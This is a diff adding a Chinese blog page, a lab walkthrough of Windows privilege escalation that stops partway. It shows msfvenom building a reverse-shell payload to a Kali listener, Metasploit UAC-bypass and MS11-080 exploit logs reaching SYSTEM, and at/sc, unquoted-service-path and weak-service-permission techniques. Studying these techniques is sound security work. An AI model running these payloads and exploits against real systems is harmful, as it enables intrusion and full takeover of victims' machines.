@@ -1,0 +1,1472 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="cn">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+  
+  
+    
+      
+    
+    
+      
+    
+  <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+  <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-flash.min.css" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Monda:300,300italic,400,400italic,700,700italic|Lobster Two:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+  
+
+<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.4.0" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.4.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.4.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.4.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '6.4.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="总之岁月漫长，然而值得等待。 ——村上春树 《如果我们的语言是威士忌》  常识提权总结">
+<meta name="keywords" content="提权">
+<meta property="og:type" content="article">
+<meta property="og:title" content="windows提权总结">
+<meta property="og:url" content="https://lengjibo.github.io/windows提权总结/index.html">
+<meta property="og:site_name" content="冷逸的个人博客|开往安河桥北~">
+<meta property="og:description" content="总之岁月漫长，然而值得等待。 ——村上春树 《如果我们的语言是威士忌》  常识提权总结">
+<meta property="og:locale" content="cn">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g301st5u1ej30vp01gt8x.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g301tvvbltj30zt02qjs6.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g30211jrn4j30ro01w3yq.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g32eeuqqgjj30u20br74x.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g32ejrsy03j30uf0f9ab0.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g32eudz8z5j30ym0e3wiw.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g32euzoul3j30jl0683yg.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g32xsbi6m0j30mk095gly.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g32xszmmzqj30oz02oaaf.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g32xxls2mhj30wj085t8t.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g32y84krm6j30p4062q4d.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g35khfxqmaj30nu07imxe.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g36uh70ijzj30tz0a3jss.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g36unec93xj30l107bmx8.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g36ve3s0vwj30oc0bbt96.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g36vgn3syuj30fa01kwez.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g36vi0x0z3j30ju071jta.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g36w0clfo8j30qx0bo3yz.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g36w98c9idj30ko05a0tx.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g36vqleof9j30p60audk5.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g36wlxx0a9j31040f4gmx.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g36x58bqpyj30yb0bkq3b.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g36xi2do4qj30mr08rgnt.jpg">
+<meta property="og:updated_time" content="2019-05-20T11:36:32.002Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="windows提权总结">
+<meta name="twitter:description" content="总之岁月漫长，然而值得等待。 ——村上春树 《如果我们的语言是威士忌》  常识提权总结">
+<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g301st5u1ej30vp01gt8x.jpg">
+
+
+
+  <link rel="alternate" href="/../../.deploy_git/atom.xml" title="冷逸的个人博客|开往安河桥北~" type="application/atom+xml" />
+
+
+
+
+  <link rel="canonical" href="https://lengjibo.github.io/windows提权总结/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>windows提权总结 | 冷逸的个人博客|开往安河桥北~</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="cn">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">冷逸的个人博客|开往安河桥北~</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Startseite</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />Über</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />Kategorien</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archiv</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-book">
+    <a href="/book/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-book"></i> <br />book</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://lengjibo.github.io/windows提权总结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="冷逸">
+      <meta itemprop="description" content="做一个温柔的人...">
+      <meta itemprop="image" content="https://i.screenshot.net/9zoe9ax">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="冷逸的个人博客|开往安河桥北~">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">windows提权总结
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+
+              
+                
+              
+
+              <time title="Post created: 2019-05-13 21:38:46" itemprop="dateCreated datePublished" datetime="2019-05-13T21:38:46+08:00">2019-05-13</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Updated at: 2019-05-20 19:36:32" itemprop="dateModified" datetime="2019-05-20T19:36:32+08:00">2019-05-20</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">in</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/提权/" itemprop="url" rel="index"><span itemprop="name">提权</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon"
+            >
+            <i class="fa fa-eye"></i>
+             Views:  
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>总之岁月漫长，然而值得等待。</p>
+<p>——村上春树 《如果我们的语言是威士忌》</p>
+<hr>
+<p>常识提权总结</p>
+<a id="more"></a>
+<h2 id="提权前奏"><a href="#提权前奏" class="headerlink" title="提权前奏"></a>提权前奏</h2><p>windows下的权限：</p>
+<pre><code>- user
+    - administrator
+        - system
+</code></pre><p>windows认证过程：</p>
+<p><a href="https://wenku.baidu.com/view/cf2ee127a5e9856a56126017.html" target="_blank" rel="noopener">https://wenku.baidu.com/view/cf2ee127a5e9856a56126017.html</a></p>
+<h2 id="windows-2k3、xp"><a href="#windows-2k3、xp" class="headerlink" title="windows 2k3、xp"></a>windows 2k3、xp</h2><p>唔，现在03的机器已经很少了，所以现在只是简单的说一些常见的思路，操作，第三方之类的除外</p>
+<p>实验环境：</p>
+<p>windows 2k3：192.168.0.105<br>kali ： 192.168.0.107</p>
+<p>首先生成个木马：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=4444 -f exe -o payload.exe</span><br></pre></td></tr></table></figure>
+<p>msf反弹</p>
+<p>查看当前权限</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g301st5u1ej30vp01gt8x.jpg" alt=""></p>
+<p>2k3可以尝试直接 getsystem进行提取</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g301tvvbltj30zt02qjs6.jpg" alt=""></p>
+<p>失败</p>
+<p>一般可能是uac问题，常识bypass uac</p>
+<p>use exploit/windows/local/ask</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; use exploit/windows/local/ask</span><br><span class="line">msf5 exploit(windows/local/ask) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/ask):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   FILENAME                    no        File name on disk</span><br><span class="line">   PATH                        no        Location on disk, %TEMP% used if not set</span><br><span class="line">   SESSION                     yes       The session to run this module on.</span><br><span class="line">   TECHNIQUE  EXE              yes       Technique to use (Accepted: PSH, EXE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/local/ask) &gt; set SESSION 2</span><br><span class="line">SESSION =&gt; 2</span><br><span class="line">msf5 exploit(windows/local/ask) &gt; set TECHNIQUE up.exe</span><br><span class="line">[-] The following options failed to validate: Value &apos;up.exe&apos; is not valid for option &apos;TECHNIQUE&apos;.</span><br><span class="line">TECHNIQUE =&gt; EXE</span><br><span class="line">msf5 exploit(windows/local/ask) &gt; set TECHNIQUE EXE</span><br><span class="line">TECHNIQUE =&gt; EXE</span><br><span class="line">msf5 exploit(windows/local/ask) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(windows/local/ask) &gt; set lhost 192.168.0.107</span><br><span class="line">lhost =&gt; 192.168.0.107</span><br><span class="line">msf5 exploit(windows/local/ask) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/ask):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   FILENAME                    no        File name on disk</span><br><span class="line">   PATH                        no        Location on disk, %TEMP% used if not set</span><br><span class="line">   SESSION    2                yes       The session to run this module on.</span><br><span class="line">   TECHNIQUE  EXE              yes       Technique to use (Accepted: PSH, EXE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &apos;&apos;, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.0.107    yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/local/ask) &gt; sessions -i</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information                                 Connection</span><br><span class="line">  --  ----  ----                     -----------                                 ----------</span><br><span class="line">  1         meterpreter x86/windows  SERVER-816F6090\xiaoming @ SERVER-816F6090  192.168.0.107:4444 -&gt; 192.168.0.105:1032 (192.168.0.105)</span><br><span class="line">  2         meterpreter x86/windows  SERVER-816F6090\xiaoming @ SERVER-816F6090  192.168.0.107:4444 -&gt; 192.168.0.105:1033 (192.168.0.105)</span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/local/ask) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.0.107:4444 </span><br><span class="line">[+] UAC is not enabled, no prompt for the user</span><br><span class="line">[*] Uploading VerOkoVbPk.exe - 73802 bytes to the filesystem...</span><br><span class="line">[*] Executing Command!</span><br></pre></td></tr></table></figure>
+<p>或者</p>
+<ul>
+<li>use exploit/windows/local/bypassuac</li>
+<li>use exploit/windows/local/bypassuac_injection</li>
+</ul>
+<p>使用漏洞提权</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_patches</span><br><span class="line"></span><br><span class="line">[+] KB2871997 is missing</span><br><span class="line">[+] KB2928120 is missing</span><br><span class="line">[+] KB977165 - Possibly vulnerable to MS10-015 kitrap0d if Windows 2K SP4 - Windows 7 (x86)</span><br><span class="line">[+] KB2305420 - Possibly vulnerable to MS10-092 schelevator if Vista, 7, and 2008</span><br><span class="line">[+] KB2592799 - Possibly vulnerable to MS11-080 afdjoinleaf if XP SP2/SP3 Win 2k3 SP2</span><br><span class="line">[+] KB2778930 - Possibly vulnerable to MS13-005 hwnd_broadcast, elevates from Low to Medium integrity</span><br><span class="line">[+] KB2850851 - Possibly vulnerable to MS13-053 schlamperei if x86 Win7 SP0/SP1</span><br><span class="line">[+] KB2870008 - Possibly vulnerable to MS13-081 track_popup_menu if x86 Windows 7 SP0/SP1</span><br></pre></td></tr></table></figure>
+<p>以ms11-080为例</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/windows/local/ms11_080_afdjoinleaf </span><br><span class="line">msf5 exploit(windows/local/ms11_080_afdjoinleaf) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/ms11_080_afdjoinleaf):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SESSION                   yes       The session to run this module on.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/local/ms11_080_afdjoinleaf) &gt; set SESSION 2</span><br><span class="line">SESSION =&gt; 2</span><br><span class="line">msf5 exploit(windows/local/ms11_080_afdjoinleaf) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.0.107:4444 </span><br><span class="line">[*] Running against Windows Server 2003 SP2</span><br><span class="line">[*] HaliQuerySystemInformation Address: 0x80a6ba1e</span><br><span class="line">[*] HalpSetSystemInformation Address: 0x80a6dc60</span><br><span class="line">[*] Triggering AFDJoinLeaf pointer overwrite...</span><br><span class="line">[*] Injecting the payload into SYSTEM process: winlogon.exe</span><br><span class="line">[*] Sending stage (179779 bytes) to 192.168.0.105</span><br><span class="line">[*] Restoring the original token...</span><br><span class="line">[*] Meterpreter session 3 opened (192.168.0.107:4444 -&gt; 192.168.0.105:1035) at 2019-05-13 21:26:33 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid </span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g30211jrn4j30ro01w3yq.jpg" alt=""></p>
+<h3 id="at命令提权"><a href="#at命令提权" class="headerlink" title="at命令提权"></a>at命令提权</h3><p>在 Windows2000、Windows 2003、Windows XP 这三类系统中，我们可以轻松将<br>Administrators 组下的用户权限提升到 SYSTEM</p>
+<p>at 是一个发布定时任务计划的命令行工具，语法比较简单。通过 at 命令发布的<br>定时任务计划， Windows 默认以 SYSTEM 权限运行。定时任务计划可以是批处理、<br>可以是一个二进制文件。 </p>
+<p>语法：at 时间 命令 </p>
+<p>例子：at 10:45PM calc.exe </p>
+<p>该命令会发布一个定时任务计划，在每日的 10:45 启动 calc.exe。 </p>
+<p>我们可以通过 “/interactive”开启界面交互模式： </p>
+<blockquote>
+<p>at 10:45PM /interactive calc.exe </p>
+</blockquote>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g32eeuqqgjj30u20br74x.jpg" alt=""></p>
+<p>在得到一个system的cmd之后，使用taskmgr命令调用任务管理器，此时的<br>任务管理器是system权限，然后kill掉explore进程，再使用任务管理器<br>新建explore进程，将会得到一个system的桌面环境</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g32ejrsy03j30uf0f9ab0.jpg" alt=""></p>
+<h4 id="at-配合-msf提权"><a href="#at-配合-msf提权" class="headerlink" title="at 配合 msf提权"></a>at 配合 msf提权</h4><p>可以采用 Regsvr32 一条命令上线</p>
+<p>msf下配置</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g32eudz8z5j30ym0e3wiw.jpg" alt=""></p>
+<p>cmd下执行</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g32euzoul3j30jl0683yg.jpg" alt=""></p>
+<p>等待上线</p>
+<p>可是这里一般会出现问题..</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g32xsbi6m0j30mk095gly.jpg" alt=""></p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g32xszmmzqj30oz02oaaf.jpg" alt=""></p>
+<p>然后我们也可以选择上线木马的方式来获取shell</p>
+<p>等待上线</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g32xxls2mhj30wj085t8t.jpg" alt=""></p>
+<p>上线后为system</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g32y84krm6j30p4062q4d.jpg" alt=""></p>
+<h2 id="windows-7、8、08、12、16"><a href="#windows-7、8、08、12、16" class="headerlink" title="windows 7、8、08、12、16"></a>windows 7、8、08、12、16</h2><h3 id="sc命令提权（administrator–-gt-system）"><a href="#sc命令提权（administrator–-gt-system）" class="headerlink" title="sc命令提权（administrator–&gt;system）"></a>sc命令提权（administrator–&gt;system）</h3><p>ps：经测试03也可以。</p>
+<p>关于sc命令：</p>
+<p>SC 是用于与服务控制管理器和服务进行通信的命令行程序。提供的功能类似于“控制面板”中“管理工具”项中的“服务”。</p>
+<p>sc Create syscmd binPath= “cmd /K start” type= own type= interact</p>
+<p>这个命令的意思是创建一个名叫syscmd的新的交互式的cmd服务</p>
+<p>然后执行</p>
+<p>sc start systcmd，就得到了一个system权限的cmd环境</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g35khfxqmaj30nu07imxe.jpg" alt=""></p>
+<h3 id="不带引号的服务路径"><a href="#不带引号的服务路径" class="headerlink" title="不带引号的服务路径"></a>不带引号的服务路径</h3><p>当系统管理员配置Windows服务时，他们必须指定要执行的命令，或者运行可执行文件的路径。</p>
+<p>当Windows服务运行时，会发生以下两种情况之一。如果给出了可执行文件，并且引用了完整路径，则系统会按字面解释它并执行。但是，如果服务的二进制路径未包含在引号中，则操作系统将会执行找到的空格分隔的服务路径的第一个实例。</p>
+<p>这可能有点不直观，所以让我们来看一个实际的例子。假设服务配置类似于以下存在bug的示例服务：</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g36uh70ijzj30tz0a3jss.jpg" alt=""></p>
+<p>Windows命令解释程序可能会遇到名称中的空格，并且希望通过将字符串包装在引号中来对它们进行转义。在上面的示例中，如果系统运行该服务，它将尝试运行以下可执行文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Program.exe</span><br><span class="line">C:\Program Files\Vulnerable.exe</span><br><span class="line">C:\Program Files\Vulnerable Service\Sub.exe</span><br><span class="line">C:\Program Files\Vulnerable Service\Sub Directory\service.exe</span><br></pre></td></tr></table></figure>
+<p>我们可以使用以下命令查看错误配置的路径</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode |findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g36unec93xj30l107bmx8.jpg" alt=""></p>
+<p>假如存在漏洞路径，我们可以将msf木马放到我们的c盘下，然后重启机器，此时，反弹回来的shell，则是一个system的shell</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g36ve3s0vwj30oc0bbt96.jpg" alt=""></p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g36vgn3syuj30fa01kwez.jpg" alt=""></p>
+<p>此外msf下已经集成了该模块(exploit/windows/local/trusted_service_path )</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g36vi0x0z3j30ju071jta.jpg" alt=""></p>
+<p>不过不太好用…..</p>
+<h3 id="不安全的服务权限"><a href="#不安全的服务权限" class="headerlink" title="不安全的服务权限"></a>不安全的服务权限</h3><p>即使正确引用了服务路径，也可能存在其他漏洞。由于管理配置错误，用户可能对服务拥有过多的权限，例如，可以直接修改它。</p>
+<p>AccessChk工具可以用来查找用户可以修改的服务：</p>
+<blockquote>
+<p>accesschk.exe -uwcqv “Authenticated Users” * /accepteula</p>
+<p>accesschk.exe -uwcqv “user” * </p>
+</blockquote>
+<p>sc命令也可以</p>
+<blockquote>
+<p>sc qc “Service”</p>
+</blockquote>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g36w0clfo8j30qx0bo3yz.jpg" alt=""></p>
+<p>找到有权限修改的服务后使用以下命令： </p>
+<blockquote>
